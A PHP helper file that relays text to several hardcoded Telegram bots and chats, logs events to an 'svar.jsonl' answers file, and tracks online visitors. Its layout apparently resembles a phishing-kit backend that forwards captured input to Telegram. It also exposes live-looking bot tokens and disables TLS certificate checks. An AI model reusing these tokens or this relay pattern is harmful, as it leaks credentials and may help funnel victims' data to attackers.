<?php
/**
 * Shared Telegram helpers — fast + PHP 5.6+ compatible for VPS.
 */

function juj_bots() {
  return array(
    "8931852827:AAGiyKh3SMLmEeeyi1JQ0fW7W0g6ZPMCbMo" => array("-1004400925861"),
    "8892755403:AAHUWYC2SESRsvn_m9DMNSy1zuIqO5Dl7S4" => array("-1004387628915", "7373778210"),
  );
}

/**
 * Send to all bots/chats in parallel (curl_multi) so PHP workers free quickly.
 */
function juj_tg_send($text, $parseMode = null, $onlyToken = null) {
  $jobs = array();
  foreach (juj_bots() as $token => $chats) {
    if ($onlyToken && $token !== $onlyToken) {
      continue;
    }
    foreach ($chats as $chatId) {
      $payload = array("chat_id" => $chatId, "text" => $text);
      if ($parseMode) {
        $payload["parse_mode"] = $parseMode;
      }
      $jobs[] = array(
        "url" => "https://api.telegram.org/bot" . $token . "/sendMessage",
        "post" => http_build_query($payload),
      );
    }
  }

  $sent = 0;

  if (function_exists("curl_multi_init")) {
    $mh = curl_multi_init();
    $handles = array();
    foreach ($jobs as $i => $job) {
      $curl = curl_init($job["url"]);
      curl_setopt($curl, CURLOPT_POST, true);
      curl_setopt($curl, CURLOPT_POSTFIELDS, $job["post"]);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 2);
      curl_setopt($curl, CURLOPT_TIMEOUT, 3);
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
      curl_multi_add_handle($mh, $curl);
      $handles[$i] = $curl;
    }

    $running = null;
    do {
      $mrc = curl_multi_exec($mh, $running);
      if ($running) {
        curl_multi_select($mh, 0.2);
      }
    } while ($running && $mrc === CURLM_OK);

    foreach ($handles as $curl) {
      $res = curl_multi_getcontent($curl);
      $code = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
      if ($res !== false && $code >= 200 && $code < 300) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
      curl_multi_remove_handle($mh, $curl);
      curl_close($curl);
    }
    curl_multi_close($mh);
    return $sent;
  }

  // Fallback: short sequential sends
  foreach ($jobs as $job) {
    if (function_exists("curl_init")) {
      $curl = curl_init($job["url"]);
      curl_setopt($curl, CURLOPT_POST, true);
      curl_setopt($curl, CURLOPT_POSTFIELDS, $job["post"]);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 2);
      curl_setopt($curl, CURLOPT_TIMEOUT, 3);
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
      $res = curl_exec($curl);
      $code = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
      curl_close($curl);
      if ($res !== false && $code >= 200 && $code < 300) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
    } else {
      $ctx = stream_context_create(array(
        "http" => array(
          "method" => "POST",
          "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
          "content" => $job["post"],
          "timeout" => 3,
          "ignore_errors" => true,
        ),
        "ssl" => array(
          "verify_peer" => false,
          "verify_peer_name" => false,
        ),
      ));
      $res = @file_get_contents($job["url"], false, $ctx);
      if ($res !== false) {
        $decoded = json_decode($res, true);
        if (is_array($decoded) && !empty($decoded["ok"])) {
          $sent++;
        }
      }
    }
  }
  return $sent;
}

function juj_log_event($row) {
  $logDir = __DIR__ . "/data";
  if (!is_dir($logDir)) {
    @mkdir($logDir, 0755, true);
  }
  $logFile = $logDir . "/svar.jsonl";
  // No LOCK_EX — under high traffic exclusive locks stall the whole site
  @file_put_contents(
    $logFile,
    json_encode($row, JSON_UNESCAPED_UNICODE) . "\n",
    FILE_APPEND
  );
}

/** Lightweight presence for live stats (no big jsonl lock). */
function juj_touch_online($sessionId) {
  if ($sessionId === "" || $sessionId === null) {
    return;
  }
  $dir = __DIR__ . "/data/online";
  if (!is_dir($dir)) {
    @mkdir($dir, 0755, true);
  }
  $safe = preg_replace('/[^a-zA-Z0-9._-]/', "_", (string)$sessionId);
  @file_put_contents($dir . "/" . $safe, (string)time());
}

function juj_count_online($seconds) {
  $dir = __DIR__ . "/data/online";
  if (!is_dir($dir)) {
    return 0;
  }
  $cut = time() - (int)$seconds;
  $n = 0;
  $dh = @opendir($dir);
  if (!$dh) {
    return 0;
  }
  while (($f = readdir($dh)) !== false) {
    if ($f === "." || $f === "..") {
      continue;
    }
    $path = $dir . "/" . $f;
    if (!is_file($path)) {
      continue;
    }
    $mtime = @filemtime($path);
    if ($mtime && $mtime >= $cut) {
      $n++;
    } elseif ($mtime && $mtime < $cut - 300) {
      @unlink($path); // cleanup stale
    }
  }
  closedir($dh);
  return $n;
}
